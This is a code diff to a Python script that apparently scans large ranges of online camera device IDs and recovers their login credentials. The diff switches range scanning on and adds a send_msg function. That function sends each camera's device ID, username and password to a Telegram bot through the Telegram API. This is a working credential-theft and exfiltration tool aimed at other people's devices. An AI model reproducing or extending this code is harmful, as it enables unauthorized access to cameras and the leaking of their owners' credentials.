@@ -6,11 +6,12 @@ import time
 import hashlib
 import os
 import sys
+import requests
 
 
 class server:
     # CHECKER CONFIG FOR SCANNING CAMS ONLINE IN RANGE
-    SCAN_NEW_CAMS = False
+    SCAN_NEW_CAMS = True
     FROM_ID = 10000000
     TO_ID = 12000000
     TIMEOUT = 30
@@ -30,6 +31,8 @@ class server:
 
     def __init__(self):
         self.process = None
+        self.send_msg(f"Start Script")
+
         try:
             if len(sys.argv) == 2:
                 if str(sys.argv[1]) == "scan":
@@ -143,6 +146,9 @@ class server:
                 print(f'\u001b[32m[+] DeviceID: {d["id"]}')
                 print(f'[+] Username: {username}')
                 print(f'[+] Password: {password}\u001b[37m')
+                self.send_msg(f'[+] DeviceID:{d["id"]}'
+                              f'[+] Username: {username}'
+                              f'[+] Password: {password}')
                 self.CamsList.remove(d["id"])
                 self.SaveCams(self.CamsList)
                 with open(self.PassFile, "a") as f:
@@ -217,6 +223,16 @@ class server:
             print("socket creation failed with error %s" % (e))
         response = s.recvfrom(4096, 0)
         return response[0]
+
+    def send_msg(self, text):
+        try:
+            token = os.environ['TELEGRAM_TOKEN']
+            chat_id = os.environ['TELEGRAM_CHAT_ID']
+            url_req = "https://api.telegram.org/bot" + token + "/sendMessage" \
+                      + "?chat_id=" + chat_id + "&text=" + text
+            requests.get(url_req)
+        except KeyError:
+            print("Environment variable does not exist")
 
     def __del__(self):
         if self.DEBUG:
